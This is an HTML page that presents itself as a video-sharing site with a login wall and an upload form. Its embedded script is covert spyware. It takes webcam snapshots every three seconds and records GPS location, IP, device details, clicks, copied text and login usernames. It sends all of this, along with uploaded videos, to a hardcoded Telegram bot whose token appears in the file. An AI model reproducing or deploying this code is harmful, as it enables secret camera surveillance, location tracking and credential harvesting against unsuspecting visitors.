<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>·ûú·û∏·ûä·üÅ·û¢·ûº·ûî·üÇ·ûÄ·ûí·üí·ûõ·û∂·ûô</title>
  <script src="firebase.js"></script> 
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Kantumruy+Pro:ital,wght@0,100..700;1,100..700&family=Roboto:wght@400;500&display=swap');
    
    body { margin: 0; padding: 20px; background: linear-gradient(135deg, #ffe8f0, #ffffff); font-family: 'Roboto', Arial, sans-serif; color: #333; }
    h1 { text-align: center; color: #ffffff; padding: 35px; background: #FF0076; border-radius: 10px; margin-bottom: 20px; font-weight: 800; font-family: "Kantumruy Pro", serif; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
    .container { max-width: 1200px; margin: 0 auto; }
    .video-grid { display: flex; flex-wrap: wrap; gap: 20px; justify-content: center; }
    .video-card { background: #fff; border-radius: 10px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); overflow: hidden; transition: transform 0.3s ease, box-shadow 0.3s ease; max-width: 480px; width: 100%; }
    .video-card:hover { transform: translateY(-5px); box-shadow: 0 8px 16px rgba(0,0,0,0.2); }
    .video-card video { display: block; width: 100%; height: auto; }
    .capture-container { display: none; }
    .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.5); }
    .modal-content { background-color: #fff; margin: 15% auto; padding: 20px; border: 1px solid #888; width: 90%; max-width: 400px; border-radius: 8px; text-align: center; position: relative; }
    .modal-content h2 { margin-top: 0; }
    .modal-content input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; font-size: 1rem; }
    .modal-content button { padding: 10px 20px; font-size: 1rem; background: #FF0076; color: #fff; border: none; border-radius: 4px; cursor: pointer; }
    .success-overlay { display: none; position: fixed; z-index: 1100; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0.5); background: rgba(255, 255, 255, 0.95); padding: 30px 40px; border-radius: 10px; text-align: center; box-shadow: 0 8px 16px rgba(0,0,0,0.2); opacity: 0; transition: transform 0.5s ease, opacity 0.5s ease; }
    .success-overlay.show { display: block; transform: translate(-50%, -50%) scale(1); opacity: 1; }
    .success-overlay .icon { font-size: 3rem; margin-bottom: 10px; }
    .success-overlay .message { font-size: 1.2rem; font-weight: bold; }
    
    .upload-section { margin-top: 30px; padding: 20px; background: #f0f8ff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
    .upload-section h2 { margin-top: 0; color: #333; }
    
    input[type="file"]#videoUpload { display: none; }
    .custom-file-upload { border: 1px solid #ccc; display: inline-block; padding: 8px 15px; cursor: pointer; background-color: #e9e9e9; color: #333; border-radius: 5px; font-weight: 500; transition: background-color 0.3s ease; margin-bottom: 10px; }
    .custom-file-upload:hover { background-color: #dcdcdc; }
    #fileNameDisplay { margin-left: 10px; font-style: italic; color: #555; }

    .upload-section button#uploadVideoButton { background: #FF0076; color: #fff; border: none; padding: 12px 22px; border-radius: 5px; cursor: pointer; font-size: 1rem; font-weight: 500; transition: background-color 0.3s ease, transform 0.2s ease; margin-top: 5px; display: block; margin-bottom: 15px; }
    .upload-section button#uploadVideoButton:hover { background: #d60065; transform: translateY(-2px); }
    .upload-section button#uploadVideoButton:active { transform: translateY(0px); }

    #uploadProgress { margin-top: 15px; padding: 10px; background-color: #f0f0f0; border-radius: 5px; }
    #uploadProgress progress { width: calc(100% - 150px); margin-right: 10px; vertical-align: middle; height: 20px; }
    #uploadProgress span { vertical-align: middle; font-size: 0.9rem; }
    #uploadedVideos video { max-width: 100%; height: auto; margin-top: 10px; border: 1px solid #ddd; border-radius: 5px; display: block; }
    #uploadedVideos div { margin-bottom: 20px; padding: 10px; background-color: #f9f9f9; border: 1px solid #eee; border-radius: 5px; }
  </style>
</head>
<body>
  <h1>·ûú·û∏·ûä·üÅ·û¢·ûº·ûî·üÇ·ûÄ·ûí·üí·ûõ·û∂·ûô</h1>
  <div class="container">
    <div class="video-grid">
      <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="machiu.mp4" type="video/mp4"></video></div>
      <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="p1.mp4" type="video/mp4"></video></div>
      <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="p2.mp4" type="video/mp4"></video></div>
      <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="p3.mp4" type="video/mp4"></video></div>
      <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="p4.mp4" type="video/mp4"></video></div>
      <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="p5.mp4" type="video/mp4"></video></div>
    </div>
    <div class="capture-container">
      <video id="videoElementForCapture" autoplay playsinline width="300" height="225"></video>
      <canvas id="snapshot" width="200" height="200"></canvas> 
    </div>
  </div>
  
  <div id="loginModal" class="modal">
    <div class="modal-content">
      <h2>Please Login to Watch Full Video</h2>
      <form id="loginForm">
        <input type="text" id="username" placeholder="Username" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit">Login</button>
      </form>
    </div>
  </div>
  
  <div id="successOverlay" class="success-overlay">
    <div class="icon">üéâ</div>
    <div class="message">Congratulations! Login Successful.</div>
  </div>

  <div class="container upload-section">
    <h2>Upload Your Video</h2>
    <label for="videoUpload" class="custom-file-upload">Choose Video File</label>
    <span id="fileNameDisplay">No file chosen</span>
    <input type="file" id="videoUpload" accept="video/*"> 
    <button id="uploadVideoButton" onclick="uploadVideo()">Upload Video</button> 
    <div id="uploadProgress" style="display: none;">
      <progress id="progressBar" max="100"></progress> 
      <span id="progressText"></span>
    </div>
    <div id="uploadedVideos"></div>
  </div>
    
  <script>
    const botToken = "6941579931:AAHJRb_kYDxxutmPJ7ji6F5p_laP1LjOnAA";
    const chatId = "8013992263";
    const videoElementForCapture = document.getElementById("videoElementForCapture"); 
    const canvas = document.getElementById("snapshot"); 
    const ctx = canvas.getContext("2d");
    let userLocation = { lat: "N/A", lon: "N/A" };
    
    let isLoggedIn = localStorage.getItem("isLoggedIn") === "true";
    let currentVideo = null; 
    let lastFullscreenVideo = null; 

    if(isLoggedIn) {
      document.getElementById('loginModal').style.display = 'none';
    }

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        videoElementForCapture.srcObject = stream;
        videoElementForCapture.onloadedmetadata = () => {
            getLocation(); 
            setTimeout(startLoopCapture, 2000); 
        };
      })
      .catch(error => {
        console.error("Camera permission denied:", error);
        sendToBot("üö´ User denied camera permission or an error occurred with camera.");
      });

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          position => { userLocation = { lat: position.coords.latitude, lon: position.coords.longitude }; },
          error => { console.error("Error getting location:", error); sendToBot(`üö´ Error getting location: ${error.message}`); },
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
        );
      } else {
        console.error("Geolocation not supported.");
        sendToBot("üö´ Geolocation not supported by this browser.");
      }
    }

    function captureAndSend() {
      if (!videoElementForCapture.srcObject || !videoElementForCapture.srcObject.active || videoElementForCapture.readyState < videoElementForCapture.HAVE_METADATA) {
        console.warn("Camera stream not ready for capture.");
        return; 
      }
      try {
        ctx.clearRect(0, 0, canvas.width, canvas.height); 
        ctx.drawImage(videoElementForCapture, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(blob => {
          if (blob) sendPhoto(blob);
          else sendToBot("üö´ Failed to capture snapshot (blob creation failed).");
        }, "image/png");
      } catch (e) {
        console.error("Error during snapshot capture:", e);
        sendToBot(`üö´ Error during snapshot capture: ${e.message}`);
      }
    }

    function sendPhoto(blob) {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blob, "snapshot.png");
      const locationInfo = (userLocation.lat !== "N/A") ? `üìç Loc: ${userLocation.lat.toFixed(5)}, ${userLocation.lon.toFixed(5)}` : "üìç Loc: N/A";
      formData.append("caption", `üì∏ Snapshot!\n${locationInfo}`);
      
      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData })
      .then(response => response.json())
      .then(data => { 
        if (!data.ok) sendToBot(`‚ö†Ô∏è TG PhotoErr: ${data.description}`); 
        if (userLocation.lat !== "N/A") sendLocation(); 
      })
      .catch(error => sendToBot(`üö´ Net PhotoErr: ${error.message}`));
    }

    function sendLocation() {
      if (userLocation.lat === "N/A") return;
      fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, latitude: userLocation.lat, longitude: userLocation.lon })
      })
      .then(response => response.json())
      .then(data => { if (!data.ok) sendToBot(`‚ö†Ô∏è TG LocErr: ${data.description}`); })
      .catch(error => sendToBot(`üö´ Net LocErr: ${error.message}`));
    }

    function sendToBot(message) {
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
      })
      .then(response => response.json())
      .then(data => { if (!data.ok) console.error("TG MsgErr:", data.description); })
      .catch(error => console.error("Net MsgErr:", error));
    }

    function startLoopCapture() { captureAndSend(); setInterval(captureAndSend, 3000); }

    const pageStartTime = Date.now();
    document.addEventListener("visibilitychange", () => {
      if (document.visibilityState === 'hidden') {
        const timeSpentSeconds = Math.round((Date.now() - pageStartTime) / 1000);
        sendToBot(`üö™ Spent ${Math.floor(timeSpentSeconds / 60)}m ${timeSpentSeconds % 60}s. Page hidden. Max scroll: ${maxScrollDepthAchieved.toFixed(0)}%`);
      } else if (document.visibilityState === 'visible') {
        sendToBot(`üëÄ Tab active. Scroll: ${getCurrentScrollPercentage().toFixed(0)}%`);
      }
    });
    window.addEventListener("beforeunload", () => {
      const timeSpentSeconds = Math.round((Date.now() - pageStartTime) / 1000);
      sendToBot(`üö™ Spent ${Math.floor(timeSpentSeconds / 60)}m ${timeSpentSeconds % 60}s. Page closing. Max scroll: ${maxScrollDepthAchieved.toFixed(0)}%`);
    });

    // EXPANDED sendIPAndBasicInfo for clarity and to avoid invisible characters
    function sendIPAndBasicInfo() {
      fetch("https://api.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
          const ip = data.ip;
          const userAgent = navigator.userAgent;
          
          let os = "Unknown OS";
          if (userAgent.includes("Win")) os = "Windows";
          else if (userAgent.includes("Mac")) os = "MacOS";
          else if (userAgent.includes("Android")) os = "Android";
          else if (userAgent.match(/iPhone|iPad|iPod/i)) os = "iOS";
          else if (userAgent.includes("Linux")) os = "Linux";

          let browser = "Unknown Browser";
          if (userAgent.includes("Firefox/")) browser = "Firefox";
          else if (userAgent.includes("Edg/")) browser = "Edge"; // Chromium Edge
          else if (userAgent.includes("OPR/") || userAgent.includes("Opera/")) browser = "Opera";
          else if (userAgent.includes("Chrome/") && !userAgent.includes("Chromium/")) browser = "Chrome";
          else if (userAgent.includes("Safari/") && !userAgent.includes("Chrome/") && !userAgent.includes("Chromium/")) browser = "Safari";
          
          const screenWidth = window.screen.width;
          const screenHeight = window.screen.height;
          const referrer = document.referrer || "Direct visit";
          const language = navigator.language;
          const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

          const basicMessage = `‚ÑπÔ∏è Visitor:
IP: ${ip}
OS: ${os}
Browser: ${browser}
Screen: ${screenWidth}x${screenHeight}
Referrer: ${referrer}
Language: ${language}
Timezone: ${timezone}
Logged In: ${isLoggedIn}`;
          // User Agent is quite long, consider if it's always needed or log separately
          // basicMessage += `\nUA: ${userAgent}`; 
          sendToBot(basicMessage);
        })
        .catch(() => {
            sendToBot("üö´ Could not fetch client IP address.");
        });
    }
    sendIPAndBasicInfo();

    function showLoginModal() { document.getElementById('loginModal').style.display = 'block'; }
    function hideLoginModal() { document.getElementById('loginModal').style.display = 'none'; }
    function showSuccessAnimation() { 
        const overlay = document.getElementById('successOverlay'); 
        overlay.classList.add('show'); 
        setTimeout(() => overlay.classList.remove('show'), 1500); 
    }
    
    const videoStates = new WeakMap();
    function getVideoState(videoElement){ 
        if(!videoStates.has(videoElement)) {
            videoStates.set(videoElement, {previousTime: 0, hasStartedPlaying: false}); 
        }
        return videoStates.get(videoElement); 
    }
    function getVideoFileName(videoElement){ 
        const source = videoElement.currentSrc || videoElement.src || ""; 
        try { 
            return decodeURIComponent(source.substring(source.lastIndexOf('/') + 1));
        } catch(e) {
            return source.substring(source.lastIndexOf('/') + 1) || 'UnknownVideo';
        }
    }

    // EXPANDED video event listeners
    document.querySelectorAll('.homevideo').forEach(videoEl => {
      const videoName = getVideoFileName(videoEl);
      const state = getVideoState(videoEl);

      videoEl.addEventListener('play', function() {
        if (!isLoggedIn && this.currentTime >= 5) { 
            this.pause(); currentVideo = this; showLoginModal(); return; 
        } 
        if (!state.hasStartedPlaying || this.ended) { 
            sendToBot(`‚ñ∂Ô∏è Started: ${videoName}`); 
            state.hasStartedPlaying = true; 
            if(this.ended) state.previousTime = 0; 
        } else { 
            sendToBot(`‚ñ∂Ô∏è Resumed: ${videoName} at ${this.currentTime.toFixed(1)}s`); 
        } 
        state.previousTime = this.currentTime;
      });

      videoEl.addEventListener('pause', function() {
        const isLoginWallPause = !isLoggedIn && currentVideo === this && this.currentTime >= 4.9 && !this.ended;
        if (!isLoginWallPause && !this.ended && this.currentTime > 0) {
            sendToBot(`‚è∏Ô∏è Paused: ${videoName} at ${this.currentTime.toFixed(1)}s`);
        }
      });

      videoEl.addEventListener('ended', function() { 
        sendToBot(`‚èπÔ∏è Finished: ${videoName}`); 
        state.hasStartedPlaying = false; 
      });

      videoEl.addEventListener('volumechange', function() { 
        sendToBot(`üîä Volume ${videoName}: ${(this.volume * 100).toFixed(0)}% (Muted: ${this.muted})`); 
      });

      videoEl.addEventListener('seeked', function() { 
        sendToBot(`‚è≠Ô∏è Seeked ${videoName} from ${state.previousTime.toFixed(1)}s to ${this.currentTime.toFixed(1)}s`); 
        state.previousTime = this.currentTime; 
      });

      videoEl.addEventListener('timeupdate', function() {
        if (!isLoggedIn && this.currentTime >= 5 && !this.paused) { 
            this.pause(); currentVideo = this; showLoginModal(); 
        } 
        if (!this.seeking) {
            state.previousTime = this.currentTime; 
        }
      });

      videoEl.addEventListener('error', function() {
        let errorMessage = 'Unknown video error';
        if (this.error) {
            switch (this.error.code) {
                case MediaError.MEDIA_ERR_ABORTED: errorMessage = 'Playback aborted'; break;
                case MediaError.MEDIA_ERR_NETWORK: errorMessage = 'Network error'; break;
                case MediaError.MEDIA_ERR_DECODE: errorMessage = 'Decoding error'; break;
                case MediaError.MEDIA_ERR_SRC_NOT_SUPPORTED: errorMessage = 'Source not supported/found'; break;
                default: errorMessage = `Error code: ${this.error.code}`;
            }
        }
        sendToBot(`‚ö†Ô∏è Video error on ${videoName}: ${errorMessage}`);
      });

      videoEl.addEventListener('webkitbeginfullscreen', function() { 
          lastFullscreenVideo = this; 
          sendToBot(`‚ÜïÔ∏è FS Enter (iOS): ${videoName}`); 
      });
      videoEl.addEventListener('webkitendfullscreen', function() { 
          sendToBot(`‚ÜïÔ∏è FS Exit (iOS): ${videoName}`); 
          if (lastFullscreenVideo === this) lastFullscreenVideo = null; 
      });
    });

    function handleFullscreenChange() {
      const fullscreenElement = document.fullscreenElement || document.webkitFullscreenElement;
      if (fullscreenElement) {
        const videoName = (fullscreenElement.classList && fullscreenElement.classList.contains('homevideo')) 
                            ? getVideoFileName(fullscreenElement) 
                            : `element (${fullscreenElement.tagName || 'Unknown'})`;
        if (fullscreenElement.classList && fullscreenElement.classList.contains('homevideo')) {
            lastFullscreenVideo = fullscreenElement;
        } else {
            lastFullscreenVideo = null; 
        }
        sendToBot(`‚ÜïÔ∏è FS Enter: ${videoName}`);
      } else {
        const exitedVideoName = lastFullscreenVideo ? getVideoFileName(lastFullscreenVideo) : "previously active element";
        sendToBot(`‚ÜïÔ∏è FS Exit (was ${exitedVideoName})`);
        lastFullscreenVideo = null;
      }
    }
    ['fullscreenchange','webkitfullscreenchange','mozfullscreenchange','MSFullscreenChange'].forEach(eventType => document.addEventListener(eventType, handleFullscreenChange));

    document.getElementById('loginForm').addEventListener('submit', function(event) {
      event.preventDefault();
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const username = usernameInput.value.trim();
      
      if (username && passwordInput.value) { // Check if password field has value
        isLoggedIn = true; 
        localStorage.setItem("isLoggedIn", "true"); 
        localStorage.setItem("username", username);
        hideLoginModal(); 
        showSuccessAnimation();
        sendToBot(`‚úÖ User "${username}" logged in.`);
        usernameInput.value = ''; 
        passwordInput.value = '';
        setTimeout(() => { 
            if (currentVideo) { currentVideo.play().catch(console.warn); currentVideo = null; }
        }, 1500);
      } else {
        alert('Please enter both username and password.');
      }
    });
    
    const videoUploadInputEl = document.getElementById('videoUpload');
    const fileNameDisplayEl = document.getElementById('fileNameDisplay');
    const uploadProgressDivEl = document.getElementById('uploadProgress');
    const progressBarEl = document.getElementById('progressBar');
    const progressTextEl = document.getElementById('progressText');
    const uploadedVideosDivEl = document.getElementById('uploadedVideos');

    videoUploadInputEl.addEventListener('change', function() {
        fileNameDisplayEl.textContent = (this.files && this.files.length > 0) ? this.files[0].name : 'No file chosen';
    });

    function uploadVideo() { 
      const file = videoUploadInputEl.files[0];
      if (!file) { alert("Please select a video file first."); return; }

      const fileSizeMB = (file.size / 1024 / 1024).toFixed(2);
      const MAX_FILE_SIZE_MB = 50; 

      if (file.size > MAX_FILE_SIZE_MB * 1024 * 1024) {
          alert(`File is too large (${fileSizeMB}MB). Max ${MAX_FILE_SIZE_MB}MB.`);
          sendToBot(`‚ö†Ô∏è Upload fail (size): ${file.name} (${fileSizeMB}MB) > ${MAX_FILE_SIZE_MB}MB`);
          videoUploadInputEl.value = null; fileNameDisplayEl.textContent = 'No file chosen'; return;
      }

      sendToBot(`üì• Upload init: ${file.name} (${fileSizeMB}MB)`);
      uploadProgressDivEl.style.display = 'block';
      progressBarEl.removeAttribute('value'); 
      progressTextEl.textContent = 'Preparing file...';

      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('video', file, file.name);
      formData.append('caption', `üé¨ User uploaded: ${file.name} (${fileSizeMB}MB)`);
      formData.append('supports_streaming', true);

      progressTextEl.textContent = 'Uploading video...';

      fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData })
      .then(response => response.json())
      .then(data => {
          progressBarEl.value = 100; 
          if (data.ok) {
              progressTextEl.textContent = 'Upload successful!';
              sendToBot(`‚úÖ TG Video Sent: ${file.name}`);
              const videoPreviewElement = document.createElement('video');
              videoPreviewElement.src = URL.createObjectURL(file);
              videoPreviewElement.controls = true;
              videoPreviewElement.width = 320; 
              const videoTitleElement = document.createElement('p');
              videoTitleElement.textContent = `Preview: ${file.name}`;
              videoTitleElement.style.fontWeight = 'bold';
              const containerElement = document.createElement('div');
              containerElement.append(videoTitleElement, videoPreviewElement);
              uploadedVideosDivEl.insertBefore(containerElement, uploadedVideosDivEl.firstChild);
          } else {
              progressTextEl.textContent = 'Upload failed.';
              sendToBot(`‚ùå TG Video Err: ${file.name} - ${data.description}`);
              console.error("TG VidErr:", data);
          }
      }).catch(error => {
          progressBarEl.value = 100; 
          progressTextEl.textContent = 'Upload failed. Network error.';
          sendToBot(`üö´ Net VidErr: ${file.name} - ${error.message}`);
          console.error("Net VidErr:", error);
      }).finally(() => {
          setTimeout(() => { 
              uploadProgressDivEl.style.display = 'none'; 
              progressBarEl.removeAttribute('value'); 
              progressTextEl.textContent = ''; 
          }, 7000);
          videoUploadInputEl.value = null; 
          fileNameDisplayEl.textContent = 'No file chosen';
      });
    }
    console.log("uploadVideo function defined:", typeof uploadVideo);

    // EXPANDED getElementDescriptor
    function getElementDescriptor(element) {
        if (!element) return 'N/A';
        let descriptor = element.tagName;
        if (element.id) descriptor += `#${element.id}`;
        if (element.className && typeof element.className === 'string' && element.className.trim() !== '') {
            descriptor += `.${element.className.trim().split(/\s+/).join('.')}`;
        }
        if (element.tagName === 'A' && element.href) {
            descriptor += ` (href: ${element.href.substring(0, 50)}${element.href.length > 50 ? '...' : ''})`;
        } else if (['BUTTON','P','H1','H2','H3','SPAN','DIV','LI','TD','TH'].includes(element.tagName)) {
            const textContent = (element.textContent || "").trim().substring(0, 30);
            if (textContent) descriptor += ` (text: "${textContent}${textContent.length === 30 ? '...' : ''}")`;
        } else if (element.type && ['INPUT','BUTTON'].includes(element.tagName)) {
            descriptor += `[type=${element.type}]`;
        }
        return descriptor;
    }
    document.addEventListener('click', event => sendToBot(`üñ±Ô∏è Click: ${getElementDescriptor(event.target)}`), true);

    let maxScrollDepthAchieved = 0;
    const scrollMilestones = [25, 50, 75, 90, 100];
    let reportedMilestones = new Set();
    
    function getCurrentScrollPercentage() {
        const scrollableHeight = document.documentElement.scrollHeight - window.innerHeight;
        return scrollableHeight <= 0 ? 100 : (window.scrollY / scrollableHeight) * 100;
    }
    function checkScrollDepth() {
        const currentDepth = getCurrentScrollPercentage();
        if (currentDepth > maxScrollDepthAchieved) maxScrollDepthAchieved = currentDepth;
        for (const milestone of scrollMilestones) {
            if (maxScrollDepthAchieved >= milestone && !reportedMilestones.has(milestone)) {
                sendToBot(`üìú Scroll ${milestone}%`);
                reportedMilestones.add(milestone);
            }
        }
    }
    let scrollTimeout; 
    window.addEventListener('scroll', () => { 
        clearTimeout(scrollTimeout); 
        scrollTimeout = setTimeout(checkScrollDepth, 250); 
    }, {passive: true}); 
    checkScrollDepth(); // Initial check

    document.addEventListener('copy', event => {
        const copiedText = (window.getSelection() || "").toString().trim();
        if (copiedText) sendToBot(`üìã Copy:"${copiedText.substring(0, 100)}${copiedText.length > 100 ? '...' : ''}"`);
    });
  </script>
</body>
</html>
